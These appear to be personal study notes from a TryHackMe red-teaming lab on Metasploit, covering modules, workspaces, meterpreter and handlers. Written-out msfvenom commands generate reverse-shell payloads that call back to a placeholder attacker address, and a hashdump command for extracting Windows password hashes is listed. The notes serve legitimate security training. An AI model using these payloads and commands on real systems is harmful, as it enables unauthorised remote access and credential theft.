#RedTeaming #tryhackme 

Start: msfconsol 
generate custom payloads: msfvenom

#### Modules and categories:
- Auxiliary: Support modules such as scanners and fuzzers
- Encoders: Encode exploits or payloads to hide from antivirus 
- Evasion: Modules that try to evade antivirus -> More advances way then encoding
- Exploits: Different exploits for different targets.
- NOPs: Do nothing, used to create buffers 
- Payloads: Code that will run on the target:

Different types of payloads:
![[Pasted image 20241117205823.png]]


Useful console commands:
```
- use:
- back: 
- seach:
- info: 
- set:
- unset:
- setg:
- unsetg:
- show options
```

Remember when an exploit is chosen, we can use the default payload OR use `show payloads` to look for other options. 


#### Workspaces:
In larger pentests, we can organize attacks and enumerations in a database while working. 

```
systemctl start postgresql
msfdb init 


---- Then launch msfconsole ------
Relevant commands: 

db_status: Confimes the db is running
workspace: lists workspaces 
db_nmap: Do a nmap scan, and save the findings in the db 
hosts:
services: 
```


### msfvenom:

Generate custom and encoded payloads 

```
msfvenom -l payloads: lists all payloads

### Examples: ###

Generate meterpreter rev shell for linux:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf

Generate meterpreter rev shell with php:
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```


Based on the payload we generate with msfvenom, we need to pick a handler (code that runs on our machine) that fits our chosen payload.  We often use `exploit/multi/handler`, but we need to customize its payload to fit the payload we have on the target:  

Example: For the .elf reverse shell, we used the standard multi handler with: `linux/x86/meterpreter/reverse_tcp` as the payload for the handler. 

When we get a connection on the target, we have to do post exploitation. 

`seach type:post platfrom:<target_platfrom> any_other_keyword`

Then in the same console as we have the reverse shell, background the session, and use the post exploitation selected. In the post exploitation, we specify the session we want to post-exploit. 

```
Usefull:
backgroud: background the current session
session: lists the current sessions
```


### meterpreter:

- Runs on the target system and act as a reverse shell.
- Runs in the memory of the target, not on disk.

We have different versions of meterpreter, that fits different targets. List possible meterpreter payloads:

`msfvenom --list payloads | grep meterpreter`

Relevant questions to answer when picking the correct meterpreter payload:
- The target operating system (Is the target operating system Linux or Windows? Is it a Mac device? Is it an Android phone? etc.)
- Components available on the target system (Is Python installed? Is this a PHP website? etc.)
- Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.)

 When we have a meterpreter "shell" on the target, we have lots of commands to use:
```
help: Since commands vary from different meterpreters
ps: Lists the current processes 
sysinfo: Lists systeminfo
hashdump: outputs the hashed found in the SAM (Security Account Manager) database (Windows)

....
```






